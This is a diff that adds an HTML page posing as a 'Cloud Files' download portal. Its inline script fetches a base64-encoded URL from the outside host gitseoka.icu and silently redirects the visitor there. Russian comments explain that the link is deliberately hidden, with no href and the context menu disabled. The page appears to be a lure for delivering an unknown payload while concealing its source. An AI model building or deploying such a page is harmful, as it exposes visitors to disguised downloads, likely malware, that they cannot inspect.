@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cloud Files</title>
+  <meta name="description" content="Simple download portal"/>
+
+  <!-- CSP: инлайн-скрипт и запрос к Site B (gitseoka.icu) -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    style-src   'self';
+    script-src  'self' 'unsafe-inline';
+    connect-src 'self' https://gitseoka.icu;
+  ">
+
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <div class="ax-wrap">
+    <div class="ax-card">
+      <div class="ax-badge" aria-hidden="true">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M8 11L12 15L16 11"
+                stroke="white" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+
+      <h1>Preparing your download…</h1>
+
+      <div class="ax-loader" aria-hidden="true">
+        <div class="ax-spinner"></div>
+        <div class="ax-bar"><div class="ax-bar-fill"></div></div>
+      </div>
+
+      <p id="ax-status" class="ax-status" aria-live="polite">Fetching link…</p>
+      <p id="ax-error"  class="ax-error"  role="alert"></p>
+
+      <!-- Кнопка без href: URL нигде не «светится» -->
+      <button id="ax-btn" class="ax-btn" type="button" disabled>
+        Download now
+      </button>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    const SETTINGS_URL = 'https://gitseoka.icu/altair.mapu6h';
+
+    const st   = document.getElementById('ax-status');
+    const err  = document.getElementById('ax-error');
+    const btn  = document.getElementById('ax-btn');
+    const spinner = document.querySelector('.ax-spinner');
+    const barFill = document.querySelector('.ax-bar-fill');
+
+    let downloadUrl = null;
+
+    // Получаем конфиг → авто-редирект
+    (async () => {
+      st.textContent = 'Fetching link…';
+      err.textContent = '';
+
+      try {
+        const r = await fetch(SETTINGS_URL, { cache: 'no-store' });
+        if (!r.ok) throw new Error('Config HTTP ' + r.status);
+
+        const { c } = await r.json();
+        if (!c) throw new Error('Missing config value');
+
+        const url = atob(c);
+        if (!/^https?:\/\//i.test(url)) throw new Error('Invalid URL');
+
+        downloadUrl = url;
+        btn.disabled = false;
+        st.textContent = 'Downloading…';
+        setTimeout(() => { window.location.href = downloadUrl; }, 700);
+
+      } catch (e) {
+        console.error(e);
+        st.textContent = '';
+        err.textContent = 'Error: ' + e.message;
+        spinner?.classList.add('ax-paused');
+        barFill?.classList.add('ax-paused');
+      }
+    })();
+
+    // Ручной дубль
+    btn.addEventListener('click', () => {
+      if (!downloadUrl) return;
+      st.textContent = 'Downloading…';
+      setTimeout(() => { window.location.href = downloadUrl; }, 150);
+    }, { passive: true });
+
+    // Без контекстного меню
+    btn.addEventListener('contextmenu', e => e.preventDefault());
+  })();
+  </script>
+</body>
+</html>
